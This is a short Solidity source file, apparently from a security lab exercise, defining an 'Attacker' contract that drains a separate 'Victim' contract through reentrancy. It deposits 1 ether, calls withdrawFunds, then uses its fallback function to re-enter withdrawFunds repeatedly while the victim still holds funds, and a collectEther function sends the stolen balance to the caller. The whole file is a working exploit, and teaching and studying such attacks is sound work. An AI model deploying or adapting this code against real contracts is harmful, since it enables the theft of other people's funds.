// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

import "lab2_ex2_victim.sol";

contract Attacker {
    Victim public victim;

    constructor(address _victimAddress) {
        victim = Victim(_victimAddress);
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        victim.depositFunds.value(1 ether)();
        victim.withdrawFunds(1 ether);
    }

    function collectEther() public {
        msg.sender.transfer(this.balance);
    }

    function() payable {
        if (victim.balance > 1 ether) {
            victim.withdrawFunds(1 ether);
        }
    }
}